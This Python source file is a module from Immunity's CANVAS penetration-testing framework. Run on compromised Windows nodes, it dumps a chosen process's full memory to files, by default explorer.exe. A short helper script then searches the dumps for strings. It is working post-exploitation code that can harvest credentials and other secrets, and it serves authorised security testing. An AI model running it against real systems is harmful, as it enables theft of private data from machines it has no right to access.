#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import cPickle
if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

NAME                = "getallprocessdata"
DESCRIPTION         = "Gets a dump of one process's memory"
VERSION             = "1.0"

DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.processname    = "explorer.exe"
    
    def getargs(self):
        self.processname = self.argsDict.get("processname", self.processname)
        return

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        for node in self.argsDict["passednodes"]:    
            if node.nodetype in ["win32Node", "win64Node"]:
                self.log("Running getallprocessdata on Win32 system")
                try:
                    pid = dInt(self.processname)
                    ##Get the name from the pid
                    self.processname = self.namefrompid(pid,node)
                    if not self.processname:
                        self.log("Was not able to get the process name for %s" % pid)
                        continue
                except :
                    #they gave us a non-integer
                    #so we need to hunt down the pid from the name
                    if ".exe" not in self.processname:
                        self.processname = self.processname + ".exe"
                        
                    pid = self.pidfromname(self.processname,node)
                    if pid == -1:
                        self.log("Was not able to get the pid for %s" % self.processname)
                        continue
                    
                ret = node.shell.getallprocessmemory(pid)
                self.log("Data pages found: %s"%len(ret))
                filepath = self.output(ip=node.get_interesting_interface(), subdir="MemoryDumps")
                filename = os.path.join(filepath, "memdump_%s[%s]"%(self.processname, pid) )
                self.log("Writing memory pages to file: %s" % filename)
                cPickle.dump(ret,file(filename,"wb"))
                    
            else:
                self.log("%s node type not supported" % node.nodetype)
     
        self.setInfo("%s (finished)" % NAME)
        return 1

if __name__=="__main__":
    """
    small script for parsing memory dumps and doing basic searching. Feel free to
    modify to suit your own ends
    """
    if len(sys.argv)>1:
        filename=sys.argv[1]
        searchstring=msunistring(sys.argv[2])
        memarray=cPickle.load(file(filename,"rb"))
        for item in memarray:
            if item[1].find(searchstring)!=-1:
                print "%x: %s"%(item[0],prettyprint(item[1].replace("\x00","")))
            
        
